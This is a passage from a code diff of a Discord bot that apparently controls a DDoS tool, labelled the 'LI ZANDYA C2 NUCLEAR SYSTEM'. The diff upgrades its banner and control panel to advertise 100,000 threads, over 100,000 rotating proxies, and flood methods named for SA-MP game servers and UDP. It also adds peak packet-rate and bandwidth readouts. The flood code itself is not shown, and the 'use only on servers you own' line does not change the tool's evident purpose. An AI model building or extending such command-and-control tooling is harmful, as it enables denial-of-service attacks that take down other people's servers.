-║ 🔥 Threads: {tester.threads:,} (30,000)                                  ║
-║ 💾 RAM: {TOTAL_RAM} GB                                                   ║
-║ 🎯 Methods: SAMP | UDP | TCP | ULTIMATE                                 ║
-║ 👥 Total Users: {len(total_users)}                                       ║
-╠══════════════════════════════════════════════════════════════════════════╣
-║ 🔐 Type !login to authenticate                                           ║
-║ 💀 After login, type !von to open C2 panel                               ║
-║ ⚠️ USE ONLY ON SERVERS YOU OWN!                                         ║
-╚══════════════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════════════════════════╗
+║                    ✅ LI ZANDYA C2 NUCLEAR SYSTEM X1000 ONLINE! ✅                       ║
+╠══════════════════════════════════════════════════════════════════════════════════════════╣
+║ 🤖 Bot: {bot.user}                                                                       ║
+║ 💻 CPU: {CPU_CORES} Cores @ {CPU_FREQ:.0f} MHz ({CPU_PERCENT}% Usage)                    ║
+║ 🔥 Threads: {tester.threads:,} (100,000)                                                 ║
+║ 🎭 Proxies: {proxy_manager.get_count():,} (100,000+)                                    ║
+║ 💾 RAM: {TOTAL_RAM} GB ({AVAILABLE_RAM} GB Free)                                         ║
+║ 🎯 Methods: SAMP ULTRA | UDP INFERNO | APOCALYPSE                                        ║
+║ 👥 Total Users: {len(total_users)}                                                       ║
+╠══════════════════════════════════════════════════════════════════════════════════════════╣
+║ 🔐 Type !login to authenticate                                                           ║
+║ 💀 After login, type !von to open C2 panel                                               ║
+║ ⚠️ USE ONLY ON SERVERS YOU OWN!                                                         ║
+╚══════════════════════════════════════════════════════════════════════════════════════════╝
     """)
 
 @bot.command()
@@ -513,13 +570,14 @@ async def von(ctx):
         await ctx.send("❌ ACCESS DENIED! Type `!login` first.")
         return
     embed = discord.Embed(
-        title="💀 LI ZANDYA C2 NUCLEAR PANEL 💀",
-        description=f"```🔥 System: {CPU_CORES} Cores | {tester.threads:,} Threads\n💾 RAM: {TOTAL_RAM} GB\n🏆 Peak: {tester.stats['peak_speed_pps']:,.0f} pps\n👑 Commander: {tester.authenticated_user}\n👥 Users: {len(total_users)}```",
+        title="💀 LI ZANDYA C2 NUCLEAR PANEL X1000 💀",
+        description=f"```🔥 System: {CPU_CORES} Cores | {tester.threads:,} Threads\n🎭 Proxies: {proxy_manager.get_count():,}\n💾 RAM: {TOTAL_RAM} GB\n🏆 Peak: {tester.stats['peak_speed_pps']:,.0f} pps\n🚀 Bandwidth: {tester.stats['peak_speed_gbps']:.2f} Gbps\n👑 Commander: {tester.authenticated_user}\n👥 Users: {len(total_users)}```",
         color=0xFF0000
     )
     await ctx.send(embed=embed, view=ControlPanel())
 
 if __name__ == "__main__":
-    print("🚀 Starting LI ZANDYA C2 NUCLEAR SYSTEM...")
-    print("💀 30,000 Threads Mode Activated!")
+    print("🚀 Starting LI ZANDYA C2 NUCLEAR SYSTEM X1000...")
+    print("💀 100,000 Threads Mode Activated!")
+    print(f"🎭 {proxy_manager.get_count():,} Proxies Loaded!")
     bot.run(TOKEN)
